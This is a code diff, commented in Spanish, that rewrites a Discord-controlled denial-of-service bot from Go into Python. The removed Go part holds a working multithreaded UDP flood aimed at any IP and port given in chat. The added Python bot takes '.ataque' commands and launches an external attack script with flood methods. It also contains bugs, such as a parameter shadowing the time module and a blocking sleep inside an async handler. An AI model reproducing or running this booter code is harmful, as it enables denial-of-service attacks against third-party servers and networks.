@@ -1,138 +1,136 @@
-package main
+import discord
+from discord.ext import commands
+import asyncio
+import socket
+import random
+import threading
+import time
+import os
+import sys  # Importar sys para pasar argumentos al script de ataque
+from colorama import Fore, Style, init
 
-import (
-	"bufio"
-	"fmt"
-	"math/rand"
-	"net"
-	"os"
-	"strconv"
-	"strings"
-	"sync"
-	"time"
+# Inicializa colorama
+init()
 
-	"github.com/bwmarrin/discordgo"
-)
+# Configuración general
+TOKEN_FILE = "token.txt"
 
-func saveToken(token string) error {
-	f, err := os.Create("token.txt")
-	if err != nil {
-		return err
-	}
-	defer f.Close()
-	_, err = f.WriteString(token)
-	return err
-}
+# Colores
+GREEN = Fore.GREEN
+RED = Fore.RED
+YELLOW = Fore.YELLOW
+BLUE = Fore.BLUE
+RESET = Style.RESET_ALL
 
-func readToken() (string, error) {
-	// Intentamos leer el token del entorno, si no existe leemos del archivo
-	token := os.Getenv("DISCORD_TOKEN")
-	if token != "" {
-		return token, nil
-	}
-	data, err := os.ReadFile("token.txt")
-	if err != nil {
-		return "", err
-	}
-	return strings.TrimSpace(string(data)), nil
-}
+# Funciones para leer y guardar el token
+def leer_token():
+    try:
+        with open(TOKEN_FILE, "r") as f:
+            return f.read().strip()
+    except FileNotFoundError:
+        return None
 
-func flood(target string, port int, duration int, wg *sync.WaitGroup) {
-	defer wg.Done()
+def guardar_token(token):
+    with open(TOKEN_FILE, "w") as f:
+        f.write(token)
 
-	raddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
-	if err != nil {
-		return
-	}
+# Obtener el token
+token = leer_token()
+if not token:
+    print(f"{RED}No se encontró el token en el archivo o en la variable de entorno.{RESET}")
 
-	conn, err := net.DialUDP("udp", nil, raddr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
+# Verificar la variable de entorno
+if 'DISCORD_TOKEN' in os.environ:
+    token = os.environ['DISCORD_TOKEN']
+    print(f"{GREEN}Token obtenido de la variable de entorno.{RESET}")
+else:
+    print(f"{RED}La variable de entorno DISCORD_TOKEN no está configurada.{RESET}")
+    exit()
 
-	endTime := time.Now().Add(time.Duration(duration) * time.Second)
+# Configuración del bot
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix=".", intents=intents)  # Prefijo cambiado a "."
 
-	packetSize := 1400
-	payload := make([]byte, packetSize)
-	rand.Read(payload)
+# Función para ejecutar el script de ataque externo
+def ejecutar_ataque(host, port, time, method):
+    try:
+        # Construir la llamada al sistema para ejecutar el script de ataque
+        comando = f"python ataque.py {host} {port} {method}"  # Asume que el script se llama ataque.py
+        print(f"{BLUE}Ejecutando comando: {comando}{RESET}")
+        os.system(comando) #Ejecutar el comando sin límite de tiempo
+        time.sleep(int(time)) #Tiempo de ataque
+    except Exception as e:
+        print(f"{RED}Error al ejecutar el script de ataque: {e}{RESET}")
 
-	for time.Now().Before(endTime) {
-		_, err := conn.Write(payload)
-		if err != nil {
-			continue
-		}
-	}
-}
+# Eventos y Comandos de Discord
+@bot.event
+async def on_ready():
+    print(f"{BLUE}Bot conectado como {bot.user.name}{RESET}")
+    print(f"{BLUE}¡Listo para atacar!{RESET}")
 
-func runFlood(target string, port, duration int) {
-	rand.Seed(time.Now().UnixNano())
-	threads := 200
-	var wg sync.WaitGroup
-	wg.Add(threads)
+@bot.command()
+async def ayuda(ctx):
+    help_message = f"""
+{GREEN}¡Bienvenido al bot de ataque!{RESET}
 
-	for i := 0; i < threads; i++ {
-		go flood(target, port, duration, &wg)
-	}
+{YELLOW}Comandos:{RESET}
+  `.ayuda`   - Muestra este mensaje de ayuda
+  `.ataque`  - Inicia un ataque
 
-	wg.Wait()
-}
+{YELLOW}Uso:{RESET}
+  `.ataque <metodo> <ip> <puerto> <tiempo>`
 
-func main() {
-	var token string
-	var err error
+{YELLOW}Métodos:{RESET}
+  `udp-flood`
+  `udp-power`
+  `udp-mix`
 
-	token, err = readToken()
-	if err != nil {
-		fmt.Println("Error al leer el token:", err)
-		fmt.Print("Introduce el token de tu bot de Discord: ")
-		reader := bufio.NewReader(os.Stdin)
-		token, _ = reader.ReadString('\n')
-		token = strings.TrimSpace(token)
-		saveToken(token)
-	}
+{YELLOW}Ejemplo:{RESET}
+  `.ataque udp-mix 127.0.0.1 80 10`
+    (Inicia un ataque UDP-Mix a 127.0.0.1:80 durante 10 segundos)
+"""
+    await ctx.send(help_message)
 
-	dg, err := discordgo.New("Bot " + token)
-	if err != nil {
-		fmt.Println("Error al crear sesión de Discord:", err)
-		return
-	}
+@bot.command()
+async def ataque(ctx, method=None, ip=None, port: int = None, time: int = None):
+    if not all([method, ip, port, time]):
+        await ctx.send(f"{RED}`.ataque <metodo> <ip> <puerto> <tiempo>`{RESET}")
+        return
 
-	dg.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
-		if m.Author.Bot {
-			return
-		}
-		content := m.Content
-		if strings.HasPrefix(content, "!ataque") {
-			args := strings.Fields(content)
-			if len(args) == 1 {
-				s.ChannelMessageSend(m.ChannelID, "Uso: `!ataque udp [IP] [PUERTO] [TIEMPO]`")
-				return
-			}
-			if len(args) == 5 && args[1] == "udp" {
-				ip := args[2]
-				port, err1 := strconv.Atoi(args[3])
-				duration, err2 := strconv.Atoi(args[4])
-				if err1 != nil || err2 != nil {
-					s.ChannelMessageSend(m.ChannelID, "Puerto o tiempo no válido.")
-					return
-				}
-				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque UDP enviado a %s:%d por %d segundos...", ip, port, duration))
-				go func() {
-					runFlood(ip, port, duration)
-					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque a %s:%d finalizado.", ip, port))
-				}()
-				return
-			}
-			s.ChannelMessageSend(m.ChannelID, "Parámetros incorrectos. Uso: `!ataque udp [IP] [PUERTO] [TIEMPO]`")
-		}
-	})
+    try:
+        socket.inet_aton(ip)
+    except socket.error:
+        await ctx.send(f"{RED}La IP proporcionada no es válida{RESET}")
+        return
 
-	err = dg.Open()
-	if err != nil {
-		fmt.Println("Error al abrir la conexión:", err)
-		return
-	}
-	fmt.Println("Bot iniciado. Presiona CTRL+C para salir.")
-	select {}
-}
+    try:
+        port = int(port)
+        time = int(time)
+    except ValueError:
+        await ctx.send(f"{RED}El puerto y el tiempo deben ser números enteros{RESET}")
+        return
+
+    if not (1 <= port <= 65535):
+        await ctx.send(f"{RED}El puerto debe estar de 1-9999{RESET}")
+        return
+
+    if time <= 0:
+        await ctx.send(f"{RED}El tiempo debe ser mayor a cero{RESET}")
+        return
+
+    if method not in ["udp-flood", "udp-power", "udp-mix"]:
+        await ctx.send(f"{RED}Método de ataque no válido, los métodos válidos son: udp-flood, udp-power, udp-mix{RESET}")
+        return
+
+    # Iniciar ataque en un hilo separado
+    print(f"{GREEN}Iniciando ataque {method} a {ip}:{port} durante {time} segundos...{RESET}")
+    await ctx.send(f"{GREEN}Iniciando ataque {method} a {ip}:{port} durante {time} segundos...{RESET}")
+
+    threading.Thread(target=ejecutar_ataque, args=(ip, port, time, method)).start()
+    time.sleep(int(time))
+    print(f"{GREEN}Ataque {method} a {ip}:{port} finalizado después de {time} segundos.{RESET}")
+    await ctx.send(f"{GREEN}Ataque {method} a {ip}:{port} finalizado después de {time} segundos{RESET}")
+
+# Iniciar el bot
+bot.run(token)
